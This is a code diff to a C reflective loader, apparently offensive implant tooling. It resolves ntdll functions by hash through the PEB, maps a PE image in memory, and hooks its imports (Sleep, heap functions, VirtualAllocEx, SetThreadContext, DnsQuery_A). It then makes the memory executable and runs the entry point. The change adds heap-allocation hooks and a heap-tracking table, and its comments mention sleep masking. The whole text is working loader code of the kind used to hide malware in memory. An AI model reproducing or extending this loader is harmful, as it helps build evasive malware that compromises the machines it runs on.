@@ -21,13 +21,13 @@ typedef struct
 	D_API( NtAllocateVirtualMemory );
 	D_API( NtProtectVirtualMemory );
 	D_API( NtQueryVirtualMemory );
-	D_API( RtlCreateHeap );
+	D_API( RtlAllocateHeap );
 } API, *PAPI;
 
 #define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
 #define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
 #define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
-#define H_API_RTLCREATEHEAP			0xe1af6849 /* RtlCreateHeap */
+#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
 #define H_API_NTCLOSE				0x40d6e69d /* NtClose */
 #define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
 
@@ -57,6 +57,7 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 
 	PVOID				Mem = NULL;
 	PVOID				Map = NULL;
+	PTABLE				Tbl = NULL;
 	DLLMAIN_T			Ent = NULL;
 	PIMAGE_DOS_HEADER		Dos = NULL;
 	PIMAGE_NT_HEADERS		Nth = NULL;
@@ -70,7 +71,7 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
 	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
 	Api.NtQueryVirtualMemory    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
-	Api.RtlCreateHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEHEAP );
+	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 
 	/* Setup Image Headers */
 	Dos = C_PTR( G_END() );
@@ -105,9 +106,12 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 			/* Process Import Table */
 			LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0e07cd7e, PTR_TO_HOOK( Mem, Sleep_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x4b184b05, PTR_TO_HOOK( Mem, HeapFree_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x84d15061, PTR_TO_HOOK( Mem, ReadFile_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xadc4062e, PTR_TO_HOOK( Mem, HeapAlloc_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xc165d757, PTR_TO_HOOK( Mem, ExitThread_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x3a5fb425, PTR_TO_HOOK( Mem, HeapReAlloc_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xdecfc1bf, PTR_TO_HOOK( Mem, GetProcAddress_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5775bd54, PTR_TO_HOOK( Mem, VirtualAllocEx_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfd1438ae, PTR_TO_HOOK( Mem, SetThreadContext_Hook ) );
@@ -129,18 +133,27 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 		/* Set Heap Parameters */
 		SLn = SLn + Sec->SizeOfRawData;
 
-		/* Give information about image */
-		( ( PTABLE ) Mem )->RxBuffer    = U_PTR( Mem );
-		( ( PTABLE ) Mem )->RxLength    = U_PTR( SLn );
-		( ( PTABLE ) Mem )->ImageLength = U_PTR( MLn );
+		if ( ( Tbl = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( TABLE ) ) ) != NULL ) {
 
-		/* Change Memory Protection. note: Work on supporting SLEEP_MASK here! */
-		if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
-			if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
-				/* Execute EntryPoint. note: do some checking for SLEEP_MASK! */
-				Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
-				Ent( C_PTR( Map ), 1, NULL );
-				Ent( C_PTR( Mbi.AllocationBase ), 4, NULL );
+			/* Give information about image */
+			Tbl->RxBuffer       = U_PTR( Mem );
+			Tbl->RxLength       = U_PTR( SLn );
+			Tbl->ImageLength    = U_PTR( MLn );
+
+			/* Initiliaze heap list header */
+			InitializeListHead( &Tbl->HeapList );
+
+			/* Set the table pointer */
+			*( PVOID * )( Mem ) = C_PTR( Tbl );
+
+			/* Change Memory Protection. note: Work on supporting SLEEP_MASK here! */
+			if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
+				if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
+					/* Execute EntryPoint. note: do some checking for SLEEP_MASK! */
+					Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
+					Ent( C_PTR( Map ), 1, NULL );
+					Ent( C_PTR( Mbi.AllocationBase ), 4, NULL );
+				};
 			};
 		};
 	};
